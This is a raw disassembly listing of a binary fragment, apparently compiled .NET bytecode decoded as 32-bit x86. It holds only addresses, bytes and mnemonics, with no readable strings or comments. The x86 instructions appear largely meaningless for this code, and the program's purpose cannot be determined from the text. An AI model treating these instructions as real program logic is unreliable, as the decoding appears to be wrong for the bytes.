  403c29:	dd 00                	fldl   (%eax)
  403c2b:	00 00                	add    %al,(%eax)
  403c2d:	00 11                	add    %dl,(%ecx)
  403c2f:	06                   	push   %es
  403c30:	2a 00                	sub    (%eax),%al
  403c32:	00 00                	add    %al,(%eax)
  403c34:	01 28                	add    %ebp,(%eax)
  403c36:	00 00                	add    %al,(%eax)
  403c38:	02 00                	add    (%eax),%al
  403c3a:	45                   	inc    %ebp
  403c3b:	00 74 b9 00          	add    %dh,0x0(%ecx,%edi,4)
  403c3f:	0f 00 00             	sldt   (%eax)
  403c42:	00 00                	add    %al,(%eax)
  403c44:	02 00                	add    (%eax),%al
  403c46:	3d 00 8b c8 00       	cmp    $0xc88b00,%eax
  403c4b:	0d 00 00 00 00       	or     $0x0,%eax
  403c50:	00 00                	add    %al,(%eax)
  403c52:	00 00                	add    %al,(%eax)
  403c54:	d5 d5                	aad    $0xd5
  403c56:	00 09                	add    %cl,(%ecx)
  403c58:	01 00                	add    %eax,(%eax)
  403c5a:	00 01                	add    %al,(%ecx)
  403c5c:	1b 30                	sbb    (%eax),%esi
  403c5e:	02 00                	add    (%eax),%al
  403c60:	5f                   	pop    %edi
  403c61:	00 00                	add    %al,(%eax)
  403c63:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403c66:	00 11                	add    %dl,(%ecx)
  403c68:	72 ed                	jb     0x403c57
  403c6a:	18 00                	sbb    %al,(%eax)
  403c6c:	70 73                	jo     0x403ce1
  403c6e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c6f:	00 00                	add    %al,(%eax)
  403c71:	0a 73 a5             	or     -0x5b(%ebx),%dh
  403c74:	00 00                	add    %al,(%eax)
  403c76:	0a 16                	or     (%esi),%dl
  403c78:	0a 6f 9c             	or     -0x64(%edi),%ch
  403c7b:	00 00                	add    %al,(%eax)
  403c7d:	0a 6f a6             	or     -0x5a(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 0b                	or     (%ebx),%cl
  403c84:	38 10                	cmp    %dl,(%eax)
  403c86:	00 00                	add    %al,(%eax)
  403c88:	00 07                	add    %al,(%edi)
  403c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c8b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403c8c:	00 00                	add    %al,(%eax)
  403c8e:	0a 74 81 00          	or     0x0(%ecx,%eax,4),%dh
  403c92:	00 01                	add    %al,(%ecx)
  403c94:	26 06                	es push %es
  403c96:	17                   	pop    %ss
  403c97:	58                   	pop    %eax
  403c98:	0a 07                	or     (%edi),%al
  403c9a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c9b:	a8 00                	test   $0x0,%al
  403c9d:	00 0a                	add    %cl,(%edx)
  403c9f:	2d e8 dd 0d 00       	sub    $0xddde8,%eax
  403ca4:	00 00                	add    %al,(%eax)
  403ca6:	07                   	pop    %es
  403ca7:	39 06                	cmp    %eax,(%esi)
  403ca9:	00 00                	add    %al,(%eax)
  403cab:	00 07                	add    %al,(%edi)
  403cad:	6f                   	outsl  %ds:(%esi),(%dx)
  403cae:	27                   	daa
  403caf:	00 00                	add    %al,(%eax)
  403cb1:	0a dc                	or     %ah,%bl
  403cb3:	06                   	push   %es
  403cb4:	18 fe                	sbb    %bh,%dh
  403cb6:	04 0c                	add    $0xc,%al
  403cb8:	dd 08                	fisttpll (%eax)
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	00 26                	add    %ah,(%esi)
  403cbe:	17                   	pop    %ss
  403cbf:	0c dd                	or     $0xdd,%al
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	00 00                	add    %al,(%eax)
  403cc5:	08 2a                	or     %ch,(%edx)
  403cc7:	00 01                	add    %al,(%ecx)
  403cc9:	1c 00                	sbb    $0x0,%al
  403ccb:	00 02                	add    %al,(%edx)
  403ccd:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403cd0:	22 3e                	and    (%esi),%bh
  403cd2:	00 0d 00 00 00 00    	add    %cl,0x0
  403cd8:	00 00                	add    %al,(%eax)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	55                   	push   %ebp
  403cdd:	55                   	push   %ebp
  403cde:	00 08                	add    %cl,(%eax)
  403ce0:	01 00                	add    %eax,(%eax)
  403ce2:	00 01                	add    %al,(%ecx)
  403ce4:	13 30                	adc    (%eax),%esi
  403ce6:	03 00                	add    (%eax),%eax
  403ce8:	2a 00                	sub    (%eax),%al
  403cea:	00 00                	add    %al,(%eax)
  403cec:	0d 00 00 11 73       	or     $0x73110000,%eax
  403cf1:	45                   	inc    %ebp
  403cf2:	00 00                	add    %al,(%eax)
  403cf4:	06                   	push   %es
  403cf5:	0a 06                	or     (%esi),%al
  403cf7:	73 aa                	jae    0x403ca3
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	0a 7d 30             	or     0x30(%ebp),%bh
  403cfe:	00 00                	add    %al,(%eax)
  403d00:	04 02                	add    $0x2,%al
  403d02:	06                   	push   %es
  403d03:	fe 06                	incb   (%esi)
  403d05:	46                   	inc    %esi
  403d06:	00 00                	add    %al,(%eax)
  403d08:	06                   	push   %es
  403d09:	73 ab                	jae    0x403cb6
  403d0b:	00 00                	add    %al,(%eax)
  403d0d:	0a 28                	or     (%eax),%ch
  403d0f:	3f                   	aas
  403d10:	00 00                	add    %al,(%eax)
  403d12:	06                   	push   %es
  403d13:	06                   	push   %es
  403d14:	7b 30                	jnp    0x403d46
  403d16:	00 00                	add    %al,(%eax)
  403d18:	04 2a                	add    $0x2a,%al
  403d1a:	00 00                	add    %al,(%eax)
  403d1c:	1b 30                	sbb    (%eax),%esi
  403d1e:	05 00 ca 00 00       	add    $0xca00,%eax
  403d23:	00 0e                	add    %cl,(%esi)
  403d25:	00 00                	add    %al,(%eax)
  403d27:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403d2a:	14 0b                	adc    $0xb,%al
  403d2c:	7e 2e                	jle    0x403d5c
  403d2e:	00 00                	add    %al,(%eax)
  403d30:	04 28                	add    $0x28,%al
  403d32:	ac                   	lods   %ds:(%esi),%al
  403d33:	00 00                	add    %al,(%eax)
  403d35:	0a 28                	or     (%eax),%ch
  403d37:	61                   	popa
  403d38:	00 00                	add    %al,(%eax)
  403d3a:	0a 74 0b 00          	or     0x0(%ebx,%ecx,1),%dh
  403d3e:	00 02                	add    %al,(%edx)
  403d40:	0b 07                	or     (%edi),%eax
  403d42:	0f 00 12             	lldt   (%edx)
  403d45:	00 16                	add    %dl,(%esi)
  403d47:	6f                   	outsl  %ds:(%esi),(%dx)
  403d48:	42                   	inc    %edx
  403d49:	00 00                	add    %al,(%eax)
  403d4b:	06                   	push   %es
  403d4c:	26 06                	es push %es
  403d4e:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  403d54:	99                   	cltd
  403d55:	00 00                	add    %al,(%eax)
  403d57:	00 17                	add    %dl,(%edi)
  403d59:	8d 13                	lea    (%ebx),%edx
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	01 0c 7e             	add    %ecx,(%esi,%edi,2)
  403d60:	ad                   	lods   %ds:(%esi),%eax
  403d61:	00 00                	add    %al,(%eax)
  403d63:	0a 0d 38 5a 00 00    	or     0x5a38,%cl
  403d69:	00 08                	add    %cl,(%eax)
  403d6b:	16                   	push   %ss
  403d6c:	a3 13 00 00 01       	mov    %eax,0x1000013
  403d71:	13 04 14             	adc    (%esp,%edx,1),%eax
  403d74:	13 05 7e 2f 00 00    	adc    0x2f7e,%eax
  403d7a:	04 13                	add    $0x13,%al
  403d7c:	06                   	push   %es
  403d7d:	11 04 14             	adc    %eax,(%esp,%edx,1)
  403d80:	14 12                	adc    $0x12,%al
  403d82:	06                   	push   %es
  403d83:	12 05 6f ae 00 00    	adc    0xae6f,%al
  403d89:	0a 11                	or     (%ecx),%dl
  403d8b:	05 74 0c 00 00       	add    $0xc74,%eax
  403d90:	02 13                	add    (%ebx),%dl
  403d92:	07                   	pop    %es
  403d93:	03 11                	add    (%ecx),%edx
  403d95:	04 11                	add    $0x11,%al
  403d97:	07                   	pop    %es
  403d98:	6f                   	outsl  %ds:(%esi),(%dx)
  403d99:	af                   	scas   %es:(%edi),%eax
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	0a 39                	or     (%ecx),%bh
  403d9e:	05 00 00 00 dd       	add    $0xdd000000,%eax
  403da3:	4a                   	dec    %edx
  403da4:	00 00                	add    %al,(%eax)
  403da6:	00 dd                	add    %bl,%ch
  403da8:	18 00                	sbb    %al,(%eax)
  403daa:	00 00                	add    %al,(%eax)
  403dac:	11 07                	adc    %eax,(%edi)
  403dae:	28 b0 00 00 0a 26    	sub    %dh,0x260a0000(%eax)
  403db4:	11 04 39             	adc    %eax,(%ecx,%edi,1)
  403db7:	08 00                	or     %al,(%eax)
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403dbe:	b0 00                	mov    $0x0,%al
  403dc0:	00 0a                	add    %cl,(%edx)
  403dc2:	26 dc 06             	faddl  %es:(%esi)
  403dc5:	08 8e 69 08 09 6f    	or     %cl,0x6f090869(%esi)
  403dcb:	b1 00                	mov    $0x0,%cl
  403dcd:	00 0a                	add    %cl,(%edx)
  403dcf:	2c 99                	sub    $0x99,%al
  403dd1:	dd 1b                	fstpl  (%ebx)
  403dd3:	00 00                	add    %al,(%eax)
  403dd5:	00 06                	add    %al,(%esi)
  403dd7:	39 07                	cmp    %eax,(%edi)
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	00 06                	add    %al,(%esi)
  403ddd:	28 b0 00 00 0a 26    	sub    %dh,0x260a0000(%eax)
  403de3:	07                   	pop    %es
  403de4:	39 07                	cmp    %eax,(%edi)
  403de6:	00 00                	add    %al,(%eax)
  403de8:	00 07                	add    %al,(%edi)
  403dea:	28 b0 00 00 0a 26    	sub    %dh,0x260a0000(%eax)
  403df0:	dc 2a                	fsubrl (%edx)
  403df2:	00 00                	add    %al,(%eax)
  403df4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403df7:	00 02                	add    %al,(%edx)
  403df9:	00 6b 00             	add    %ch,0x0(%ebx)
  403dfc:	19 84 00 18 00 00 00 	sbb    %eax,0x18(%eax,%eax,1)
  403e03:	00 02                	add    %al,(%edx)
  403e05:	00 04 00             	add    %al,(%eax,%eax,1)
  403e08:	aa                   	stos   %al,%es:(%edi)
  403e09:	ae                   	scas   %es:(%edi),%al
  403e0a:	00 1b                	add    %bl,(%ebx)
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	00 00                	add    %al,(%eax)
  403e10:	13 30                	adc    (%eax),%esi
  403e12:	04 00                	add    $0x0,%al
  403e14:	26 00 00             	add    %al,%es:(%eax)
  403e17:	00 0f                	add    %cl,(%edi)
  403e19:	00 00                	add    %al,(%eax)
  403e1b:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403e1e:	04 72                	add    $0x72,%al
  403e20:	17                   	pop    %ss
  403e21:	1a 00                	sbb    (%eax),%al
  403e23:	70 12                	jo     0x403e37
  403e25:	00 16                	add    %dl,(%esi)
  403e27:	6f                   	outsl  %ds:(%esi),(%dx)
  403e28:	43                   	inc    %ebx
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	06                   	push   %es
  403e2c:	26 06                	es push %es
  403e2e:	74 48                	je     0x403e78
  403e30:	00 00                	add    %al,(%eax)
  403e32:	01 0b                	add    %ecx,(%ebx)
  403e34:	02 7b 30             	add    0x30(%ebx),%bh
  403e37:	00 00                	add    %al,(%eax)
  403e39:	04 07                	add    $0x7,%al
  403e3b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3c:	b3 00                	mov    $0x0,%bl
  403e3e:	00 0a                	add    %cl,(%edx)
  403e40:	16                   	push   %ss
  403e41:	2a 00                	sub    (%eax),%al
  403e43:	00 1b                	add    %bl,(%ebx)
  403e45:	30 04 00             	xor    %al,(%eax,%eax,1)
  403e48:	c5 00                	lds    (%eax),%eax
  403e4a:	00 00                	add    %al,(%eax)
  403e4c:	10 00                	adc    %al,(%eax)
  403e4e:	00 11                	add    %dl,(%ecx)
  403e50:	1b 8d 01 00 00 01    	sbb    0x1000001(%ebp),%ecx
  403e56:	25 16 28 b4 00       	and    $0xb42816,%eax
  403e5b:	00 0a                	add    %cl,(%edx)
  403e5d:	8c 8a 00 00 01 a2    	mov    %cs,-0x5dff0000(%edx)
  403e63:	25 17 28 b5 00       	and    $0xb52817,%eax
  403e68:	00 0a                	add    %cl,(%edx)
  403e6a:	a2 25 18 28 94       	mov    %al,0x94281825
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	0a a2 25 19 28 b6    	or     -0x49d7e6db(%edx),%ah
  403e77:	00 00                	add    %al,(%eax)
  403e79:	0a a2 25 1a 28 b7    	or     -0x48d7e5db(%edx),%ah
  403e7f:	00 00                	add    %al,(%eax)
  403e81:	0a 28                	or     (%eax),%ch
  403e83:	b8 00 00 0a 73       	mov    $0x730a0000,%eax
  403e88:	b9 00 00 0a 28       	mov    $0x280a0000,%ecx
  403e8d:	ba 00 00 0a 8c       	mov    $0x8c0a0000,%edx
  403e92:	8d 00                	lea    (%eax),%eax
  403e94:	00 01                	add    %al,(%ecx)
  403e96:	a2 28 bb 00 00       	mov    %al,0xbb28
  403e9b:	0a 0a                	or     (%edx),%cl
  403e9d:	73 bc                	jae    0x403e5b
  403e9f:	00 00                	add    %al,(%eax)
  403ea1:	0a 28                	or     (%eax),%ch
  403ea3:	bd 00 00 0a 06       	mov    $0x60a0000,%ebp
  403ea8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea9:	23 00                	and    (%eax),%eax
  403eab:	00 0a                	add    %cl,(%edx)
  403ead:	0b 07                	or     (%edi),%eax
  403eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb0:	24 00                	and    $0x0,%al
  403eb2:	00 0a                	add    %cl,(%edx)
  403eb4:	0b 73 be             	or     -0x42(%ebx),%esi
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	0a 0c 07             	or     (%edi,%eax,1),%cl
  403ebc:	0d 16 13 04 38       	or     $0x38041316,%eax
  403ec1:	1f                   	pop    %ds
  403ec2:	00 00                	add    %al,(%eax)
  403ec4:	00 09                	add    %cl,(%ecx)
  403ec6:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  403ec9:	13 05 08 12 05 72    	adc    0x72051208,%eax
  403ecf:	31 1a                	xor    %ebx,(%edx)
  403ed1:	00 70 28             	add    %dh,0x28(%eax)
  403ed4:	bf 00 00 0a 6f       	mov    $0x6f0a0000,%edi
  403ed9:	c0 00 00             	rolb   $0x0,(%eax)
  403edc:	0a 26                	or     (%esi),%ah
  403ede:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403ee1:	58                   	pop    %eax
  403ee2:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403ee5:	04 09                	add    $0x9,%al
  403ee7:	8e 69 32             	mov    0x32(%ecx),%gs
  403eea:	da 08                	fimull (%eax)
  403eec:	6f                   	outsl  %ds:(%esi),(%dx)
  403eed:	3d 00 00 0a 16       	cmp    $0x160a0000,%eax
  403ef2:	1f                   	pop    %ds
  403ef3:	14 6f                	adc    $0x6f,%al
  403ef5:	c1 00 00             	roll   $0x0,(%eax)
  403ef8:	0a 6f c2             	or     -0x3e(%edi),%ch
  403efb:	00 00                	add    %al,(%eax)
  403efd:	0a 13                	or     (%ebx),%dl
  403eff:	06                   	push   %es
  403f00:	dd 0d 00 00 00 26    	fisttpll 0x26000000
  403f06:	72 37                	jb     0x403f3f
  403f08:	1a 00                	sbb    (%eax),%al
  403f0a:	70 13                	jo     0x403f1f
  403f0c:	06                   	push   %es
  403f0d:	dd 00                	fldl   (%eax)
  403f0f:	00 00                	add    %al,(%eax)
  403f11:	00 11                	add    %dl,(%ecx)
  403f13:	06                   	push   %es
  403f14:	2a 00                	sub    (%eax),%al
  403f16:	00 00                	add    %al,(%eax)
  403f18:	01 10                	add    %edx,(%eax)
  403f1a:	00 00                	add    %al,(%eax)
  403f1c:	00 00                	add    %al,(%eax)
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	b5 b5                	mov    $0xb5,%ch
  403f22:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403f28:	13 30                	adc    (%eax),%esi
  403f2a:	07                   	pop    %es
  403f2b:	00 d7                	add    %dl,%bh
  403f2d:	01 00                	add    %eax,(%eax)
  403f2f:	00 11                	add    %dl,(%ecx)
  403f31:	00 00                	add    %al,(%eax)
  403f33:	11 73 bd             	adc    %esi,-0x43(%ebx)
  403f36:	00 00                	add    %al,(%eax)
  403f38:	06                   	push   %es
  403f39:	25 72 5f 14 00       	and    $0x145f72,%eax
  403f3e:	70 6f                	jo     0x403faf
  403f40:	a8 00                	test   $0x0,%al
  403f42:	00 06                	add    %al,(%esi)
  403f44:	72 49                	jb     0x403f8f
  403f46:	1a 00                	sbb    (%eax),%al
  403f48:	70 6f                	jo     0x403fb9
  403f4a:	b5 00                	mov    $0x0,%ch
  403f4c:	00 06                	add    %al,(%esi)
  403f4e:	25 72 5f 1a 00       	and    $0x1a5f72,%eax
  403f53:	70 6f                	jo     0x403fc4
  403f55:	a8 00                	test   $0x0,%al
  403f57:	00 06                	add    %al,(%esi)
  403f59:	7e 0f                	jle    0x403f6a
  403f5b:	00 00                	add    %al,(%eax)
  403f5d:	04 6f                	add    $0x6f,%al
  403f5f:	b5 00                	mov    $0x0,%ch
  403f61:	00 06                	add    %al,(%esi)
  403f63:	25 72 69 1a 00       	and    $0x1a6972,%eax
  403f68:	70 6f                	jo     0x403fd9
  403f6a:	a8 00                	test   $0x0,%al
  403f6c:	00 06                	add    %al,(%esi)
  403f6e:	28 b5 00 00 0a 6f    	sub    %dh,0x6f0a0000(%ebp)
  403f74:	3d 00 00 0a 6f       	cmp    $0x6f0a0000,%eax
  403f79:	b5 00                	mov    $0x0,%ch
  403f7b:	00 06                	add    %al,(%esi)
  403f7d:	25 72 73 1a 00       	and    $0x1a7372,%eax
  403f82:	70 6f                	jo     0x403ff3
  403f84:	a8 00                	test   $0x0,%al
  403f86:	00 06                	add    %al,(%esi)
  403f88:	73 c3                	jae    0x403f4d
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	0a 28                	or     (%eax),%ch
  403f8e:	c4 00                	les    (%eax),%eax
  403f90:	00 0a                	add    %cl,(%edx)
  403f92:	6f                   	outsl  %ds:(%esi),(%dx)
  403f93:	3d 00 00 0a 72       	cmp    $0x720a0000,%eax
  403f98:	79 1a                	jns    0x403fb4
  403f9a:	00 70 14             	add    %dh,0x14(%eax)
  403f9d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f9e:	c5 00                	lds    (%eax),%eax
  403fa0:	00 0a                	add    %cl,(%edx)
  403fa2:	72 8d                	jb     0x403f31
  403fa4:	1a 00                	sbb    (%eax),%al
  403fa6:	70 28                	jo     0x403fd0
  403fa8:	c6 00 00             	movb   $0x0,(%eax)
  403fab:	0a 0a                	or     (%edx),%cl
  403fad:	12 00                	adc    (%eax),%al
  403faf:	28 c7                	sub    %al,%bh
  403fb1:	00 00                	add    %al,(%eax)
  403fb3:	0a 72 91             	or     -0x6f(%edx),%dh
  403fb6:	1a 00                	sbb    (%eax),%al
  403fb8:	70 72                	jo     0x40402c
  403fba:	9b                   	fwait
  403fbb:	1a 00                	sbb    (%eax),%al
  403fbd:	70 6f                	jo     0x40402e
  403fbf:	c5 00                	lds    (%eax),%eax
  403fc1:	00 0a                	add    %cl,(%edx)
  403fc3:	72 a7                	jb     0x403f6c
  403fc5:	1a 00                	sbb    (%eax),%al
  403fc7:	70 72                	jo     0x40403b
  403fc9:	b3 1a                	mov    $0x1a,%bl
  403fcb:	00 70 6f             	add    %dh,0x6f(%eax)
  403fce:	c5 00                	lds    (%eax),%eax
  403fd0:	00 0a                	add    %cl,(%edx)
  403fd2:	28 7f 00             	sub    %bh,0x0(%edi)
  403fd5:	00 0a                	add    %cl,(%edx)
  403fd7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd8:	b5 00                	mov    $0x0,%ch
  403fda:	00 06                	add    %al,(%esi)
  403fdc:	25 72 bf 1a 00       	and    $0x1abf72,%eax
  403fe1:	70 6f                	jo     0x404052
  403fe3:	a8 00                	test   $0x0,%al
  403fe5:	00 06                	add    %al,(%esi)
  403fe7:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  403fea:	00 06                	add    %al,(%esi)
  403fec:	0a 12                	or     (%edx),%dl
  403fee:	00 28                	add    %ch,(%eax)
  403ff0:	c7 00 00 0a 6f b5    	movl   $0xb56f0a00,(%eax)
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	06                   	push   %es
  403ff9:	25 72 cd 1a 00       	and    $0x1acd72,%eax
  403ffe:	70 6f                	jo     0x40406f
  404000:	a8 00                	test   $0x0,%al
  404002:	00 06                	add    %al,(%esi)
  404004:	28 6d 00             	sub    %ch,0x0(%ebp)
  404007:	00 0a                	add    %cl,(%edx)
  404009:	6f                   	outsl  %ds:(%esi),(%dx)
  40400a:	6e                   	outsb  %ds:(%esi),(%dx)
  40400b:	00 00                	add    %al,(%eax)
  40400d:	0a 6f 6f             	or     0x6f(%edi),%ch
  404010:	00 00                	add    %al,(%eax)
  404012:	0a 6f b5             	or     -0x4b(%edi),%ch
  404015:	00 00                	add    %al,(%eax)
  404017:	06                   	push   %es
  404018:	25 72 d7 1a 00       	and    $0x1ad772,%eax
  40401d:	70 6f                	jo     0x40408e
  40401f:	a8 00                	test   $0x0,%al
  404021:	00 06                	add    %al,(%esi)
  404023:	7e 03                	jle    0x404028
  404025:	00 00                	add    %al,(%eax)
  404027:	04 6f                	add    $0x6f,%al
  404029:	b5 00                	mov    $0x0,%ch
  40402b:	00 06                	add    %al,(%esi)
  40402d:	25 72 e7 1a 00       	and    $0x1ae772,%eax
  404032:	70 6f                	jo     0x4040a3
  404034:	a8 00                	test   $0x0,%al
  404036:	00 06                	add    %al,(%esi)
  404038:	28 49 00             	sub    %cl,0x0(%ecx)
  40403b:	00 06                	add    %al,(%esi)
  40403d:	0a 12                	or     (%edx),%dl
  40403f:	00 28                	add    %ch,(%eax)
  404041:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404047:	00 00                	add    %al,(%eax)
  404049:	0a 72 f3             	or     -0xd(%edx),%dh
  40404c:	1a 00                	sbb    (%eax),%al
  40404e:	70 72                	jo     0x4040c2
  404050:	e7 1a                	out    %eax,$0x1a
  404052:	00 70 6f             	add    %dh,0x6f(%eax)
  404055:	c5 00                	lds    (%eax),%eax
  404057:	00 0a                	add    %cl,(%edx)
  404059:	72 fd                	jb     0x404058
  40405b:	1a 00                	sbb    (%eax),%al
  40405d:	70 72                	jo     0x4040d1
  40405f:	69 1a 00 70 6f c5    	imul   $0xc56f7000,(%edx),%ebx
  404065:	00 00                	add    %al,(%eax)
  404067:	0a 6f b5             	or     -0x4b(%edi),%ch
  40406a:	00 00                	add    %al,(%eax)
  40406c:	06                   	push   %es
  40406d:	25 72 09 1b 00       	and    $0x1b0972,%eax
  404072:	70 6f                	jo     0x4040e3
  404074:	a8 00                	test   $0x0,%al
  404076:	00 06                	add    %al,(%esi)
  404078:	28 50 00             	sub    %dl,0x0(%eax)
  40407b:	00 06                	add    %al,(%esi)
  40407d:	6f                   	outsl  %ds:(%esi),(%dx)
  40407e:	b5 00                	mov    $0x0,%ch
  404080:	00 06                	add    %al,(%esi)
  404082:	25 72 23 1b 00       	and    $0x1b2372,%eax
  404087:	70 6f                	jo     0x4040f8
  404089:	a8 00                	test   $0x0,%al
  40408b:	00 06                	add    %al,(%esi)
  40408d:	7e 0d                	jle    0x40409c
  40408f:	00 00                	add    %al,(%eax)
  404091:	04 6f                	add    $0x6f,%al
  404093:	b5 00                	mov    $0x0,%ch
  404095:	00 06                	add    %al,(%esi)
  404097:	25 72 37 1b 00       	and    $0x1b3772,%eax
  40409c:	70 6f                	jo     0x40410d
  40409e:	a8 00                	test   $0x0,%al
  4040a0:	00 06                	add    %al,(%esi)
  4040a2:	28 4b 00             	sub    %cl,0x0(%ebx)
  4040a5:	00 06                	add    %al,(%esi)
  4040a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a8:	b5 00                	mov    $0x0,%ch
  4040aa:	00 06                	add    %al,(%esi)
  4040ac:	25 72 4d 1b 00       	and    $0x1b4d72,%eax
  4040b1:	70 6f                	jo     0x404122
  4040b3:	a8 00                	test   $0x0,%al
  4040b5:	00 06                	add    %al,(%esi)
  4040b7:	28 c9                	sub    %cl,%cl
  4040b9:	00 00                	add    %al,(%eax)
  4040bb:	0a 73 6c             	or     0x6c(%ebx),%dh
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	0a 28                	or     (%eax),%ch
  4040c2:	ca 00 00             	lret   $0x0
  4040c5:	0a 0b                	or     (%ebx),%cl
  4040c7:	12 01                	adc    (%ecx),%al
  4040c9:	28 cb                	sub    %cl,%bl
  4040cb:	00 00                	add    %al,(%eax)
  4040cd:	0a 0b                	or     (%ebx),%cl
  4040cf:	12 01                	adc    (%ecx),%al
  4040d1:	28 cc                	sub    %cl,%ah
  4040d3:	00 00                	add    %al,(%eax)
  4040d5:	0a 6f b5             	or     -0x4b(%edi),%ch
  4040d8:	00 00                	add    %al,(%eax)
  4040da:	06                   	push   %es
  4040db:	25 72 89 14 00       	and    $0x148972,%eax
  4040e0:	70 6f                	jo     0x404151
  4040e2:	a8 00                	test   $0x0,%al
  4040e4:	00 06                	add    %al,(%esi)
  4040e6:	72 59                	jb     0x404141
  4040e8:	14 00                	adc    $0x0,%al
  4040ea:	70 6f                	jo     0x40415b
  4040ec:	b5 00                	mov    $0x0,%ch
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	25 72 63 1b 00       	and    $0x1b6372,%eax
  4040f5:	70 6f                	jo     0x404166
  4040f7:	a8 00                	test   $0x0,%al
  4040f9:	00 06                	add    %al,(%esi)
  4040fb:	7e 11                	jle    0x40410e
  4040fd:	00 00                	add    %al,(%eax)
  4040ff:	04 6f                	add    $0x6f,%al
  404101:	b5 00                	mov    $0x0,%ch
  404103:	00 06                	add    %al,(%esi)
  404105:	6f                   	outsl  %ds:(%esi),(%dx)
  404106:	b2 00                	mov    $0x0,%dl
  404108:	00 06                	add    %al,(%esi)
  40410a:	2a 00                	sub    (%eax),%al
  40410c:	1b 30                	sbb    (%eax),%esi
  40410e:	02 00                	add    (%eax),%al
  404110:	5b                   	pop    %ebx
  404111:	00 00                	add    %al,(%eax)
  404113:	00 00                	add    %al,(%eax)
  404115:	00 00                	add    %al,(%eax)
  404117:	00 7e 0e             	add    %bh,0xe(%esi)
  40411a:	00 00                	add    %al,(%eax)
  40411c:	04 28                	add    $0x28,%al
  40411e:	1a 00                	sbb    (%eax),%al
  404120:	00 0a                	add    %cl,(%edx)
  404122:	39 0f                	cmp    %ecx,(%edi)
  404124:	00 00                	add    %al,(%eax)
  404126:	00 28                	add    %ch,(%eax)
  404128:	49                   	dec    %ecx
  404129:	00 00                	add    %al,(%eax)
  40412b:	06                   	push   %es
  40412c:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  404132:	70 00                	jo     0x404134
  404134:	00 06                	add    %al,(%esi)
  404136:	28 69 00             	sub    %ch,0x0(%ecx)
  404139:	00 06                	add    %al,(%esi)
  40413b:	28 08                	sub    %cl,(%eax)
  40413d:	00 00                	add    %al,(%eax)
  40413f:	06                   	push   %es
  404140:	25 3a 06 00 00       	and    $0x63a,%eax
  404145:	00 26                	add    %ah,(%esi)
  404147:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  40414d:	d0 00                	rolb   $1,(%eax)
  40414f:	00 0a                	add    %cl,(%edx)
  404151:	28 06                	sub    %al,(%esi)
  404153:	00 00                	add    %al,(%eax)
  404155:	06                   	push   %es
  404156:	25 3a 06 00 00       	and    $0x63a,%eax
  40415b:	00 26                	add    %ah,(%esi)
  40415d:	38 05 00 00 00 28    	cmp    %al,0x28000000
  404163:	d1 00                	roll   $1,(%eax)
  404165:	00 0a                	add    %cl,(%edx)
  404167:	dd 06                	fldl   (%esi)
  404169:	00 00                	add    %al,(%eax)
  40416b:	00 26                	add    %ah,(%esi)
  40416d:	dd 00                	fldl   (%eax)
  40416f:	00 00                	add    %al,(%eax)
  404171:	00 2a                	add    %ch,(%edx)
  404173:	00 01                	add    %al,(%ecx)
  404175:	10 00                	adc    %al,(%eax)
  404177:	00 00                	add    %al,(%eax)
  404179:	00 00                	add    %al,(%eax)
  40417b:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40417f:	06                   	push   %es
  404180:	01 00                	add    %eax,(%eax)
  404182:	00 01                	add    %al,(%ecx)
  404184:	1b 30                	sbb    (%eax),%esi
  404186:	03 00                	add    (%eax),%eax
  404188:	bf 00 00 00 12       	mov    $0x12000000,%edi
  40418d:	00 00                	add    %al,(%eax)
  40418f:	11 7e d2             	adc    %edi,-0x2e(%esi)
  404192:	00 00                	add    %al,(%eax)
  404194:	0a 0a                	or     (%edx),%cl
  404196:	72 6f                	jb     0x404207
  404198:	1b 00                	sbb    (%eax),%eax
  40419a:	70 28                	jo     0x4041c4
  40419c:	94                   	xchg   %eax,%esp
  40419d:	00 00                	add    %al,(%eax)
  40419f:	0a 72 75             	or     0x75(%edx),%dh
  4041a2:	1b 00                	sbb    (%eax),%eax
  4041a4:	70 28                	jo     0x4041ce
  4041a6:	7f 00                	jg     0x4041a8
  4041a8:	00 0a                	add    %cl,(%edx)
  4041aa:	72 a1                	jb     0x40414d
  4041ac:	1b 00                	sbb    (%eax),%eax
  4041ae:	70 73                	jo     0x404223
  4041b0:	d3 00                	roll   %cl,(%eax)
